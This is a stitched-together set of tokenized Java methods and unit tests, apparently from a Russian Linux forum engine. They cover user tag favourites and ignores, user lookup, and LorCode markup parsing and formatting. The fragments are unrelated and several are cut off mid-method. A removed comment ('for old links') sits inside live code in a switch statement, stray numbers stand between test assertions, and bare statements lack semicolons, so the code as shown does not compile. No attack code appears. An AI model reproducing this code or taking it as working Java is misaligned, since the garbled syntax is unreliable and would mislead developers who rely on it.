private List < String > parseTags ( String tags , Errors errors ) { return JavaConverters . seqAsJavaListConverter ( TagName . parseAndValidateTags ( tags , errors , Integer . MAX_VALUE ) ) . asJava ( ) ; } 
public boolean hasFavoriteTag ( User user , String tagName ) { return favoritesGet ( user ) . contains ( tagName ) ; } 
public boolean hasIgnoreTag ( User user , String tagName ) { return ignoresGet ( user ) . contains ( tagName ) ; } 
private static List < String > errorsToStringList ( Errors errors ) { if ( errors . hasErrors ( ) ) { return errors . getAllErrors ( ) . stream ( ) . map ( ObjectError : : getCode ) . collect ( Collectors . toList ( ) ) ; 
public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , true ) ; try { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , false ) ; try { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( tech ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto ) ; } 
public Map < String , Integer > getYandexWidget ( HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { return ImmutableMap . of ( ) ; 
public ModelAndView serverInfo ( ) { List < User > moderators = userService . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userService . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public RedirectView showComments ( @RequestParam String nick ) throws Exception { User user = userService . getUserCached ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public User getUser ( String nick ) throws UserNotFoundException { return getUser ( findUserId ( nick ) ) ; } 
public int findUserId ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { logger . warn ( " Invalid user name '{}' " , nick ) ; throw new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private User getUserInternal ( int id ) throws UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > { return new User ( rs ) ; } , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userService . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { try { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; TagNode tagNode = ( TagNode ) node ; RootNode rootNode = tagNode . getRootNode ( ) ; ToHtmlFormatter toHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserService userService = rootNode . getUserService ( ) ; String result ; try { if ( userService ! = null & & toHtmlFormatter ! = null ) { User user = userService . getUserCached ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" %s \" >%s</a></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" %s \" >%s</a></s></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void initTest ( ) throws Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . thenReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . thenReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userService . getUser ( username ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userService ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.RELEVANCE); break; case "2": setValue(SearchOrder.DATE); break; default: setValue(SearchOrder.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userService)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } try { setValue ( userService . getUser ( s ) ) ; 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . unblock ( user , user ) ; } 
private void rescueMaxcom ( ) throws Exception { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
private static char firstNonQuote ( CharSequence buff , int start ) { for ( int pt = start - 1 ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( CharSequence buff , int start ) { for ( int pt = start + 1 ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private boolean isQuoteClosing ( CharSequence buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . length ( ) = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return true ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( Character . isLetterOrDigit ( after ) ) return false ; return true ; } 
public MoreLikeThisService moreLikeThisService ( ) { return Mockito . mock ( MoreLikeThisService . class ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg ) ; 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg ) ; 
public String format ( String text ) { return ToLorCodeTexFormatter . quote ( text , " [br] " ) ; } 
public String format ( String text ) { return quote ( text , " " ) ; } 
public static String escapeCode ( String text ) { return CODE_ESCAPE_REGEXP . matcher ( text ) . replaceAll ( " $1[[$2]] " ) ; } 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a, true) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , toLorCodeTexFormatter . format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test")); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &")); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest")); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest")); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest")); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test")); 12 } 
public void codeEscapeBasic ( ) { assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [[/code]] " ) ) ; assertEquals ( " ][[code]] " , ToLorCodeTexFormatter . escapeCode ( " ][code] " ) ) ; assertEquals ( " [[code]] [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [/code] " ) ) ; } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , toLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , toLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; } 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; 
public String parseComment ( String text , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , false , nofollow ) , text ) . renderXHtml ( ) ; } 
String parseCommentRSS ( String text , boolean secure ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , true , false ) , text ) . renderXHtml ( ) ; } 
public String extractPlainTextFromLorcode ( String text ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( false , true , false ) , text ) . renderOg ( ) ; } 
public String parseTopicWithMinimizedCut ( String text , String cutURL , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( true , cutURL , secure , nofollow ) , text ) . renderXHtml ( ) ; } 
public String parseTopic ( String text , boolean secure , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( false , null , secure , nofollow ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
